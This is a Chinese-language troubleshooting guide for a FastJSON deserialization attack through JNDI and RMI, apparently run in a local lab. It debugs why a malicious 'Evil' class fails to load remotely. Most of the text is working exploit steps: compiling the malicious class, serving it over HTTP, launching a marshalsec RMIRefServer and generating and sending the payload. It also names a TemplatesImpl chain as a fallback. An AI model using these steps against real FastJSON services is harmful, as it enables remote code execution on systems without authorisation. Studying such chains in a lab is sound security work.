# JNDI 类加载问题修复指南

## 错误信息

```
Caused by: java.lang.NoClassDefFoundError: Evil (wrong name: com/govuln/fastjsonattack/Evil)
```

## 问题分析

这个错误说明：
1. ✅ **JNDI lookup 成功**：RMI 服务器连接正常，已经执行了 lookup
2. ✅ **类文件下载成功**：从 HTTP 服务器下载了类文件
3. ❌ **类名不匹配**：类加载器期望类名是 `Evil`，但实际类文件中的类名是 `com.govuln.fastjsonattack.Evil`

## 根本原因

RMI 服务器 URL 中的类名配置不正确，或者 HTTP 服务器上的类文件路径不正确。

## 解决方案

### 方案一：确保 RMI 服务器 URL 使用完整类名（推荐）

启动 RMI 服务器时，URL 中的类名必须是**完整包路径**：

```bash
# ✅ 正确：使用完整类名
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1099

# ❌ 错误：只使用类名
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#Evil 1099
```

### 方案二：确保 HTTP 服务器路径正确

HTTP 服务器必须在 `target/classes` 目录下启动，这样类文件的路径才是正确的：

```bash
# ✅ 正确：在 classes 目录下启动
cd fastjsonattack/target/classes
python -m http.server 8087

# 这样类文件路径是：
# http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class

# ❌ 错误：在其他目录启动
cd fastjsonattack
python -m http.server 8087
# 这样路径不对
```

### 方案三：验证类文件路径

测试类文件是否可以正确访问：

```bash
# 测试完整路径
curl http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class

# 应该返回二进制数据（200 状态码）
# 如果返回 404，说明路径不对
```

## 完整操作步骤

### 1. 编译恶意类

```bash
cd fastjsonattack
mvn clean compile
```

### 2. 验证类文件存在

```bash
# 检查类文件是否存在
dir target\classes\com\govuln\fastjsonattack\Evil.class
# 应该能看到 Evil.class 文件
```

### 3. 启动 HTTP 服务器（关键！）

```bash
# ⚠️ 必须在 classes 目录下启动
cd target\classes
python -m http.server 8087
```

### 4. 验证 HTTP 服务器路径

在浏览器或使用 curl 访问：
```
http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class
```

应该能下载到类文件。如果返回 404，说明路径不对。

### 5. 启动 RMI 服务器（使用完整类名）

```bash
# ⚠️ 关键：URL 中的类名必须是完整包路径
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1099
```

注意：
- URL 中使用 `#` 分隔符
- 类名使用点号（`.`）分隔包路径：`com.govuln.fastjsonattack.Evil`
- 不是斜杠（`/`）：`com/govuln/fastjsonattack/Evil` ❌

### 6. 生成 Payload

```bash
cd fastjsonattack
java -cp "target/classes;..." com.govuln.fastjsonattack.Client0 rmi://127.0.0.1:1099/exp
```

### 7. 发送 Payload

将生成的 JSON 发送到 FastJSON 服务。

## 常见错误对比

### 错误 1：RMI URL 中类名不完整

```bash
# ❌ 错误
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#Evil 1099

# ✅ 正确
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1099
```

### 错误 2：HTTP 服务器路径不对

```bash
# ❌ 错误：在项目根目录启动
cd fastjsonattack
python -m http.server 8087
# 类文件路径会是：http://127.0.0.1:8087/target/classes/com/govuln/fastjsonattack/Evil.class

# ✅ 正确：在 classes 目录下启动
cd fastjsonattack/target/classes
python -m http.server 8087
# 类文件路径是：http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class
```

### 错误 3：RMI URL 中使用斜杠而不是点号

```bash
# ❌ 错误：使用斜杠
http://127.0.0.1:8087/#com/govuln/fastjsonattack/Evil

# ✅ 正确：使用点号
http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil
```

## 验证步骤

### 步骤 1：检查类文件

```bash
# 确认类文件存在
dir fastjsonattack\target\classes\com\govuln\fastjsonattack\Evil.class
```

### 步骤 2：测试 HTTP 访问

```bash
# 在 classes 目录下启动 HTTP 服务器
cd fastjsonattack\target\classes
python -m http.server 8087

# 在另一个终端测试访问
curl http://127.0.0.1:8087/com/govuln/fastjsonattack/Evil.class
# 应该返回二进制数据
```

### 步骤 3：测试 RMI 服务器

```bash
# 启动 RMI 服务器
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1099

# 应该看到：
# * Opening JRMP listener on 1099
```

### 步骤 4：检查日志

当发送 payload 时，查看：
- RMI 服务器日志：应该看到 lookup 请求
- HTTP 服务器日志：应该看到类文件下载请求
- FastJSON 服务日志：应该看到错误信息（如果还有问题）

## 如果仍然失败

如果按照上述步骤操作后仍然失败，可能的原因：

1. **JDK 版本问题**：JDK 8u191+ 默认禁止远程类加载（但你说版本 < 191，所以应该不是这个问题）

2. **JdbcRowSetImpl 的限制**：JDK 8 中 `JdbcRowSetImpl.connect()` 的实现可能有问题

3. **建议使用 TemplatesImpl**：不依赖 JNDI，更可靠
   ```bash
   java -cp "target/classes;..." com.govuln.fastjsonattack.Client
   ```

## 总结

关键点：
1. ✅ HTTP 服务器必须在 `target/classes` 目录下启动
2. ✅ RMI 服务器 URL 中的类名必须是完整包路径：`com.govuln.fastjsonattack.Evil`
3. ✅ 使用点号（`.`）而不是斜杠（`/`）分隔包路径
4. ✅ 验证类文件可以正确访问


